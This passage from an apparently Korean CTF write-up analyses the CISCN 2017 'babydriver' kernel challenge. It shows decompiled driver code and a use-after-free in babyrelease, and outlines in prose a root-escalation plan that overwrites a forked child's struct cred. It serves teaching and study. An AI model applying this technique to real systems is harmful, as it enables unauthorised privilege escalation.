class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>예시 코드를 돌려보면 아래와 같은 결과가 나온다.</p>
<p><img src="/images/monthly_24_05_image2.png" alt="그림 2. [Use-After-free 취약점]"></p>
<center><b>그림 2. [Use-After-free 취약점]</center></b>

<ol>
<li><code>heap1</code>을 할당하고 <code>free</code>를 해주고, 다른 변수(<code>heap2</code>)에 같은 크기로 할당하면 다시 그 공간을 재사용하게 된다.</li>
<li><code>free</code>를 해주어도 그 전에 사용했던 공간에 할당이 가능하다.</li>
<li>사이즈를 다르게 입력하면 다른 공간에 할당한다.</li>
</ol>
<p><br><br></p>
<h1 id="4-UAF-문제-분석-및-풀이"><a href="#4-UAF-문제-분석-및-풀이" class="headerlink" title="4. UAF 문제 분석 및 풀이"></a>4. UAF 문제 분석 및 풀이</h1><p>CISCN CTF 2017에 출제된 <code>babydriver</code> 문제로 UAF가 어떻게 발생하는지 알아보자.</p>
<br>

<h2 id="4-1-디바이스-드라이버"><a href="#4-1-디바이스-드라이버" class="headerlink" title="4.1. 디바이스 드라이버"></a>4.1. 디바이스 드라이버</h2><p>먼저 본격적으로 코드 분석에 앞서, 사전지식으로 알아야 할 게 있다. 바로 디바이스 드라이버라는 것이다.</p>
<p><strong>1. 디바이스 드라이버</strong></p>
<p>키보드, 하드디스크 같은 디바이스들을 컨트롤하는 것이 바로 디바이스 드라이버이다. </p>
<p><strong>디바이스 드라이버</strong>란 실제 장치 부분을 추상화시켜 사용자 프로그램이 정형화된 인터페이스를 통해 디바이스를 접근할 수 있도록 하는 프로그램이다. 리눅스에서는 모든 것을 파일로 간주하는데, 이러한 디바이스 드라이버도 파일로 관리된다.</p>
<p><code>/dev/</code> 아래에 들어있는 파일들이 바로 디바이스 드라이버 인터페이스고, 하드웨어와는 독립적으로 응용 프로그램이 파일 <code>open</code>, <code>read</code> 같은 함수로 접근이 가능하다.</p>
<p><img src="/images/monthly_24_05_image3.png" alt="그림 3. [Device Driver]"></p>
<center><b>그림 3. [Device Driver]<br>https://jeongzero.oopy.io/c5c9c223-d17f-4bbc-b054-4d9fa1faffd1</center></b><br>

<p>Real Device가 실제 물리적인 하드웨어이고, Device Driver를 통해 실제 디바이스를 컨트롤하게 된다. 그러나 장치 별로 제공되는 디바이스 드라이버가 다르기 때문에 리눅스에서는 VFS라는 파일 시스템 기능을 지원한다.</p>
<p>또한 모든 디바이스 드라이버는 <code>/dev</code> 하위에 파일로 취급되고, 위에서 말한 <code>open</code>, <code>read</code>, <code>write</code> 등의 연산을 통해 디바이스를 컨트롤할 수 있다. 이러한 디바이스 파일에게는 고유한 번호와 이름이 할당되어 있다.</p>
<p> <strong>2. 디바이스 드라이버 종류</strong></p>
<p><img src="/images/monthly_24_05_image4.png" alt="그림 4. [Device Driver 종류]"></p>
<center><b>그림 4. [Device Driver 종류]<br>https://jeongzero.oopy.io/c5c9c223-d17f-4bbc-b054-4d9fa1faffd1</center></b><br>

<p>디바이스 드라이버는 크게 3가지로 나뉜다.</p>
<table>
<thead>
<tr>
<th>종류</th>
<th>설명</th>
<th>등록 함수</th>
<th>특징</th>
</tr>
</thead>
<tbody><tr>
<td>Char device driver</td>
<td>device를 파일처럼 접근하여 직접 read&#x2F;write 수행</td>
<td><code>register_chrdev()</code></td>
<td>버퍼 캐시 사용 X, 자료의 순차성을 지님, 터미널, 키보드 사운드 카드, 프린터 등</td>
</tr>
<tr>
<td>block device</td>
<td>disk와 같은 filesystem을 기반으로 block 단위로 data를 read&#x2F;write</td>
<td><code>register_blkdev()</code></td>
<td>블록 단위의 입출력 가능, 버퍼 캐시에 의한 내부 장치 표현, 파일 시스템에 의해 마운트되어 관리됨, 하드디스크 등</td>
</tr>
<tr>
<td>network device driver</td>
<td>network의 physical layer와 frame 단위의 data 송수신</td>
<td><code>register_netdev()</code></td>
<td>네트워크 스택과 네트워크 하드웨어 사이에 위치해 데이터 송수신 담당, 이더넷, 네트워크 인터페이스 카드 등</td>
</tr>
</tbody></table>
<br>

<h2 id="4-2-setting"><a href="#4-2-setting" class="headerlink" title="4.2. setting"></a>4.2. setting</h2><p>babydriver 문제 파일에는 <code>bzImage</code>, <code>rootfs.cpio</code>, <code>boot.sh</code> 파일들이 존재한다.</p>
<p>문제 분석을 위해 다음과 같이 환경을 세팅해주었다.</p>
<br>

<h3 id="4-2-1-vmlinux-생성"><a href="#4-2-1-vmlinux-생성" class="headerlink" title="4.2.1. vmlinux 생성"></a>4.2.1. vmlinux 생성</h3><p><code>bzImage</code>를 이용해 <code>vmlinux</code>를 생성한다.<br><code>extract-vmlinux</code> 스크립트를 이용하면 <code>vmlinux</code>를 쉽게 추출할 수 있다.<br>extract-vmlinux 스크립트는 아래 사이트는 참고하였다.<br><a target="_blank" rel="noopener" href="https://raw.githubusercontent.com/torvalds/linux/master/scripts/extract-vmlinux">https://raw.githubusercontent.com/torvalds/linux/master/scripts/extract-vmlinux</a> </p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./extract-vmlinux bzImage &gt; ./vmlinux </span><br></pre></td></tr></table></figure>
<br>

<h3 id="4-2-2-rootfs-cpio-압축-해제"><a href="#4-2-2-rootfs-cpio-압축-해제" class="headerlink" title="4.2.2. rootfs.cpio 압축 해제"></a>4.2.2. rootfs.cpio 압축 해제</h3><p><code>rootfs.cpio</code>는 압축된 파일 시스템이므로 압축을 풀어서 파일 시스템을 추출한다. </p>
<p><code>rootfs.gz</code>로 확장자를 변경한 뒤 <code>gzip -d rootfs.gz</code>로 압축을 풀고, <code>cpio -id -v &lt; rootfs.cpio</code> 명령어를 통해 파일 시스템을 추출하였다. </p>
<p><code>lib/modules/4.4.72</code>에 분석할 커널 모듈인 <code>babydriver.ko</code>가 존재한다. </p>
<br>

<h3 id="4-2-3-qemu-설치"><a href="#4-2-3-qemu-설치" class="headerlink" title="4.2.3. qemu 설치"></a>4.2.3. qemu 설치</h3><p><code>boot.sh</code>를 실행시키기 위해 <code>qemu</code>를 설치한다.</p>
<p>분석을 진행한 환경이 <code>x86-64</code>이므로 아래의 명령어를 이용해 <code>qemu</code>를 설치해주었다. </p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get install qemu-system-x86 </span><br></pre></td></tr></table></figure>

<br>

<h2 id="4-3-문제-풀이-및-분석"><a href="#4-3-문제-풀이-및-분석" class="headerlink" title="4.3. 문제 풀이 및 분석"></a>4.3. 문제 풀이 및 분석</h2><h3 id="4-3-1-boot-sh-확인"><a href="#4-3-1-boot-sh-확인" class="headerlink" title="4.3.1. boot.sh 확인"></a>4.3.1. boot.sh 확인</h3><p>우선 <code>boot.sh</code>를 살펴보자.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line">qemu-system-x86_64 -initrd ./test/rootfs.cpio -kernel bzImage -append <span class="string">&#x27;console=ttyS0 root=/dev/ram oops=panic panic=1&#x27;</span> -enable-kvm -monitor /dev/null -m 64M --nographic  -smp cores=1,threads=1 -cpu kvm64,+smep</span><br></pre></td></tr></table></figure>

<p>해당 코드를 살펴보면, <code>smep</code>이 걸려있는 걸 알 수 있다. 이는 user 공간에서 kernel 영역의 함수를 실행하지 못하게 하는 보호 기법이다. </p>
<p><code>kaslr</code>은 걸려있지 않다는 것 또한 확인할 수 있었다. </p>
<br>

<h3 id="4-3-2-문제-풀이-아이디어"><a href="#4-3-2-문제-풀이-아이디어" class="headerlink" title="4.3.2. 문제 풀이 아이디어"></a>4.3.2. 문제 풀이 아이디어</h3><p><code>boot.sh</code>로 부팅을 하면 ctf 권한을 가진 상태로 부팅이 된다.</p>
<p><img src="/images/monthly_24_05_image5.png" alt="그림 5. [boot.sh 실행]"></p>
<center><b>그림 5. [boot.sh 실행]<br></center></b><br>


<p><code>rootfs/etc</code> 폴더 아래에는 <code>group</code>, <code>init.d</code>, <code>passwd</code>가 존재한다.</p>
<p><img src="/images/monthly_24_05_image6.png" alt="그림 6. [rootfs/etc에 존재하는 파일]"></p>
<center><b>그림 6. [rootfs/etc에 존재하는 파일]<br></center></b><br>

<p>그 중 <code>passwd</code> 파일을 살펴보면 root 권한이 존재하는 것을 확인할 수 있었다. </p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root:x:0:0:root:/root:/bin/sh</span><br><span class="line">ctf:x:1000:1000:chal:/home/ctf:/bin/sh</span><br></pre></td></tr></table></figure>

<p>ctf 권한을 root 권한으로 LPE(권한 상승) 하는 것이 문제의 목적이다.</p>
<p>이제 커널 모듈을 분석해보자.</p>
<br>

<h3 id="4-3-3-babydriver-ko-분석"><a href="#4-3-3-babydriver-ko-분석" class="headerlink" title="4.3.3. babydriver.ko 분석"></a>4.3.3. babydriver.ko 분석</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">babydriver_init</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v0; <span class="comment">// rdx</span></span><br><span class="line">  <span class="type">int</span> v1; <span class="comment">// edx</span></span><br><span class="line">  __int64 v2; <span class="comment">// rsi</span></span><br><span class="line">  __int64 v3; <span class="comment">// rdx</span></span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// ebx</span></span><br><span class="line">  <span class="class"><span class="keyword">class</span> *<span class="title">v5</span>;</span> <span class="comment">// rax</span></span><br><span class="line">  __int64 v6; <span class="comment">// rdx</span></span><br><span class="line">  __int64 v7; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( (<span class="type">signed</span> <span class="type">int</span>)alloc_chrdev_region(&amp;babydev_no, <span class="number">0LL</span>, <span class="number">1LL</span>, <span class="string">&quot;babydev&quot;</span>) &gt;= <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    cdev_init(&amp;cdev_0, &amp;fops);</span><br><span class="line">    v2 = babydev_no;</span><br><span class="line">    cdev_0.owner = &amp;_this_module;</span><br><span class="line">    v4 = cdev_add(&amp;cdev_0, babydev_no, <span class="number">1LL</span>);</span><br><span class="line">    <span class="keyword">if</span> ( v4 &gt;= <span class="number">0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v5 = (class *)_class_create(&amp;_this_module, <span class="string">&quot;babydev&quot;</span>, &amp;babydev_no);</span><br><span class="line">      babydev_class = v5;</span><br><span class="line">      <span class="keyword">if</span> ( v5 )</span><br><span class="line">      &#123;</span><br><span class="line">        v7 = device_create(v5, <span class="number">0LL</span>, babydev_no, <span class="number">0LL</span>, <span class="string">&quot;babydev&quot;</span>);</span><br><span class="line">        v1 = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span> ( v7 )</span><br><span class="line">          <span class="keyword">return</span> v1;</span><br><span class="line">        printk(&amp;unk_351, <span class="number">0LL</span>, <span class="number">0LL</span>);</span><br><span class="line">        class_destroy(babydev_class);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        printk(&amp;unk_33B, <span class="string">&quot;babydev&quot;</span>, v6);</span><br><span class="line">      &#125;</span><br><span class="line">      cdev_del(&amp;cdev_0);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      printk(&amp;unk_327, v2, v3);</span><br><span class="line">    &#125;</span><br><span class="line">    unregister_chrdev_region(babydev_no, <span class="number">1LL</span>);</span><br><span class="line">    <span class="keyword">return</span> v4;</span><br><span class="line">  &#125;</span><br><span class="line">  printk(&amp;unk_309, <span class="number">0LL</span>, v0);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>babydriver 커널 모듈을 초기화하는 과정으로, 커널에서 모듈을 불러올 때 가장 먼저 실행되는 함수이다.</p>
<p><code>alloc_chrdev_region()</code> 함수로 Char Device의 번호를 할당한다.</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __cdecl <span class="title function_">babydriver_exit</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  device_destroy(babydev_class, babydev_no);</span><br><span class="line">  class_destroy(babydev_class);</span><br><span class="line">  cdev_del(&amp;cdev_0);</span><br><span class="line">  unregister_chrdev_region(babydev_no, <span class="number">1LL</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>모듈이 종료될 때 호출되는 함수이다.</p>
<p><code>init()</code> 함수에서 할당한 디바이스를 제거하는 함수다.</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">babyopen</span><span class="params">(inode *inode, file *filp)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v2; <span class="comment">// rdx</span></span><br><span class="line"></span><br><span class="line">  _fentry__(inode, filp);</span><br><span class="line">  babydev_struct.device_buf = (<span class="type">char</span> *)kmem_cache_alloc_trace(kmalloc_caches[<span class="number">6</span>], <span class="number">37748928LL</span>, <span class="number">64LL</span>);</span><br><span class="line">  babydev_struct.device_buf_len = <span class="number">64LL</span>;</span><br><span class="line">  printk(<span class="string">&quot;device open\n&quot;</span>, <span class="number">37748928LL</span>, v2);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>open</code>을 하면, 커널에서 동적 할당을 통해 64바이트 만큼 <code>babydev_struct</code> 구조체의 <code>device_buf</code>에 힙을 할당한다.</p>
<p>그리고 <code>babydev_struct</code> 구조체의 <code>device_buf_len</code> 필드에 크기 64를 <code>buf_len</code> 필드에 저장한다.</p>
<p><code>kmem_cache_alloc_trace()</code> 함수가 바로 동적 할당 함수이다.</p>
<p>babydev 구조체는 아래와 같다.</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">babydevice_t</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="type">char</span> *device_buf;</span><br><span class="line">  <span class="type">size_t</span> device_buf_len;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ssize_t</span> __fastcall <span class="title function_">babyread</span><span class="params">(file *filp, <span class="type">char</span> *buffer, <span class="type">size_t</span> length, <span class="type">loff_t</span> *offset)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">size_t</span> v4; <span class="comment">// rdx</span></span><br><span class="line">  <span class="type">ssize_t</span> result; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">ssize_t</span> v6; <span class="comment">// rbx</span></span><br><span class="line"></span><br><span class="line">  _fentry__(filp, buffer);</span><br><span class="line">  <span class="keyword">if</span> ( !babydev_struct.device_buf )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1LL</span>;</span><br><span class="line">  result = <span class="number">-2LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( babydev_struct.device_buf_len &gt; v4 )</span><br><span class="line">  &#123;</span><br><span class="line">    v6 = v4;</span><br><span class="line">    copy_to_user(buffer);</span><br><span class="line">    result = v6;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>babyread()</code> 함수는 <code>device_buf</code> 필드가 <code>null</code>이면 <code>-1</code>을 반환한다.<br><code>length(v4)</code>와 <code>buf_len</code>을 비교해 <code>buf_len</code>이 더 크면 <code>copy_to_user()</code> 함수를 호출하여 kernel 영역의 테이블을 user 공간인 <code>buffer</code>로 복사한다.</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ssize_t</span> __fastcall <span class="title function_">babywrite</span><span class="params">(file *filp, <span class="type">const</span> <span class="type">char</span> *buffer, <span class="type">size_t</span> length, <span class="type">loff_t</span> *offset)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">size_t</span> v4; <span class="comment">// rdx</span></span><br><span class="line">  <span class="type">ssize_t</span> result; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">ssize_t</span> v6; <span class="comment">// rbx</span></span><br><span class="line"></span><br><span class="line">  _fentry__(filp, buffer);</span><br><span class="line">  <span class="keyword">if</span> ( !babydev_struct.device_buf )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1LL</span>;</span><br><span class="line">  result = <span class="number">-2LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( babydev_struct.device_buf_len &gt; v4 )</span><br><span class="line">  &#123;</span><br><span class="line">    v6 = v4;</span><br><span class="line">    copy_from_user();</span><br><span class="line">    result = v6;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>read</code> 함수와 마찬가지로 <code>device_buf</code>가 <code>null</code>이면 <code>-1</code>을 반환한다.<br><code>device_buf_len</code>이 <code>v4</code>보다 크면 <code>copy_from_user()</code> 함수를 호출해 user 영역인 buffer 테이블을 kernel 영역으로 복사한다.</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">babyioctl</span><span class="params">(file *filp, <span class="type">unsigned</span> <span class="type">int</span> command, <span class="type">unsigned</span> __int64 arg)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">size_t</span> v3; <span class="comment">// rdx</span></span><br><span class="line">  <span class="type">size_t</span> v4; <span class="comment">// rbx</span></span><br><span class="line">  __int64 v5; <span class="comment">// rdx</span></span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  _fentry__(filp, *(_QWORD *)&amp;command);</span><br><span class="line">  v4 = v3;</span><br><span class="line">  <span class="keyword">if</span> ( command == <span class="number">65537</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    kfree(babydev_struct.device_buf);</span><br><span class="line">    babydev_struct.device_buf = (<span class="type">char</span> *)_kmalloc(v4, <span class="number">37748928LL</span>);</span><br><span class="line">    babydev_struct.device_buf_len = v4;</span><br><span class="line">    printk(<span class="string">&quot;alloc done\n&quot;</span>, <span class="number">37748928LL</span>, v5);</span><br><span class="line">    result = <span class="number">0LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    printk(&amp;unk_2EB, v3, v3);</span><br><span class="line">    result = <span class="number">-22LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>2번째 인자 <code>command</code>가 <code>0x10001(65537)</code>이면 <code>device_buf</code>를 해제(free)하고 3번째 인자(<code>arg(v4)</code>)만큼 힙을 재할당하여 초기화한다. 이때 힙 영역은 <code>open</code> 시에 할당 받은 힙 영역이다. <code>buf_len</code>도 마찬가지다.</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">babyrelease</span><span class="params">(inode *inode, file *filp)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v2; <span class="comment">// rdx</span></span><br><span class="line"></span><br><span class="line">  _fentry__(inode, filp);</span><br><span class="line">  kfree(babydev_struct.device_buf);</span><br><span class="line">  printk(<span class="string">&quot;device release\n&quot;</span>, filp, v2);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>release()</code> 함수는 <code>close()</code> 함수가 호출될 때 호출된다. <code>device_buf</code>를 해제하지만 해제하면서 초기화 작업을 하지는 않는다.<br>해제 후 초기화를 안 하기 때문에 UAF가 발생하게 된다.<br>즉, <strong>Dangling Pointer</strong>(해제된 메모리 영역을 가리키는 포인터)가 된다.</p>
<br>

<h3 id="4-3-4-struct-cred-이용"><a href="#4-3-4-struct-cred-이용" class="headerlink" title="4.3.4. struct cred 이용"></a>4.3.4. struct cred 이용</h3><p>초기 <code>open()</code> → <code>ioctl()</code> 시에 cred 구조체 사이즈인 168 바이트를 인자로 전달하여 해당 크기의 청크를 할당받게 한다. 그리고 close()를 하면 168 바이트 힙 청크를 가리키는 전역변수에 들어있는 값은 Dangling Pointer가 된다.</p>
<p>그리고 <code>fork()</code> 함수를 호출하여 <code>fork()</code> 내부에서 힙 할당을 하는 로직을 이용하여 free된 청크(현재 dangling pointer 주소인 청크)를 재할당받는다.</p>
<p>fork에서 힙을 할당받는 로직은 바로 부모의 pcb 정보 중 cred 구조체 필드들을 복사하기 위함이다.</p>
<ul>
<li>danling pointer 만들기</li>
<li>fork 통해 dangling pointer를 할당받게 하고 (이는 cred 구조체 영역)</li>
<li>저 영역은 <code>babywrite()</code>를 통해 user 공간의 값을 커널영역으로 복사할 수 있음</li>
<li>즉, fork에서 할당받은 cred 구조체 영역을 수정 가능하단 소리 → uid부분을 0으로 만들 수 있음</li>
<li>그 다음 user 영역에서 시스템 함수를 그냥 실행시키면 LPE가 일어남. (단, 이는 fork한 자식 프로세스 내에서 실행해야 함)</li>
</ul>
<br>

<h3 id="4-3-5-함수-호출"><a href="#4-3-5-함수-호출" class="headerlink" title="4.3.5. 함수 호출"></a>4.3.5. 함수 호출</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">ifdef</span> __ARCH_WANT_SYS_CLONE</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_CLONE_BACKWARDS</span></span><br><span class="line">SYSCALL_DEFINE5(clone, <span class="type">unsigned</span> <span class="type">long</span>, clone_flags, <span class="type">unsigned</span> <span class="type">long</span>, newsp,</span><br><span class="line">		 <span class="type">int</span> __user *, parent_tidptr,</span><br><span class="line">		 <span class="type">unsigned</span> <span class="type">long</span>, tls,</span><br><span class="line">		 <span class="type">int</span> __user *, child_tidptr)</span><br><span class="line"><span class="meta">#<span class="keyword">elif</span> defined(CONFIG_CLONE_BACKWARDS2)</span></span><br><span class="line">SYSCALL_DEFINE5(clone, <span class="type">unsigned</span> <span class="type">long</span>, newsp, <span class="type">unsigned</span> <span class="type">long</span>, clone_flags,</span><br><span class="line">		 <span class="type">int</span> __user *, parent_tidptr,</span><br><span class="line">		 <span class="type">int</span> __user *, child_tidptr,</span><br><span class="line">		 <span class="type">unsigned</span> <span class="type">long</span>, tls)</span><br><span class="line"><span class="meta">#<span class="keyword">elif</span> defined(CONFIG_CLONE_BACKWARDS3)</span></span><br><span class="line">SYSCALL_DEFINE6(clone, <span class="type">unsigned</span> <span class="type">long</span>, clone_flags, <span class="type">unsigned</span> <span class="type">long</span>, newsp,</span><br><span class="line">		<span class="type">int</span>, stack_size,</span><br><span class="line">		<span class="type">int</span> __user *, parent_tidptr,</span><br><span class="line">		<span class="type">int</span> __user *, child_tidptr,</span><br><span class="line">		<span class="type">unsigned</span> <span class="type">long</span>, tls)</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">SYSCALL_DEFINE5(clone, <span class="type">unsigned</span> <span class="type">long</span>, clone_flags, <span class="type">unsigned</span> <span class="type">long</span>, newsp,</span><br><span class="line">		 <span class="type">int</span> __user *, parent_tidptr,</span><br><span class="line">		 <span class="type">int</span> __user *, child_tidptr,</span><br><span class="line">		 <span class="type">unsigned</span> <span class="type">long</span>, tls)</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">return</span> _do_fork(clone_flags, newsp, <span class="number">0</span>, parent_tidptr, child_tidptr, tls);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure>

<p>권한 상승을 위해 <code>fork()</code> 함수를 호출해야 하는데 이를 호출하면 시스템 콜 <code>clone()</code> 함수를 호출하여 사용 처리가 된다.</p>
<p><code>clone()</code> 내부에서는 <code>do_fork()</code> 함수를 호출한다.</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">long</span> _do_fork(<span class="type">unsigned</span> <span class="type">long</span> clone_flags,</span><br><span class="line">	      <span class="type">unsigned</span> <span class="type">long</span> stack_start,</span><br><span class="line">	      <span class="type">unsigned</span> <span class="type">long</span> stack_size,</span><br><span class="line">	      <span class="type">int</span> __user *parent_tidptr,</span><br><span class="line">	      <span class="type">int</span> __user *child_tidptr,</span><br><span class="line">	      <span class="type">unsigned</span> <span class="type">long</span> tls)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">completion</span> <span class="title">vfork</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">pid</span> *<span class="title">pid</span>;</span></span><br><span class="line">	<span 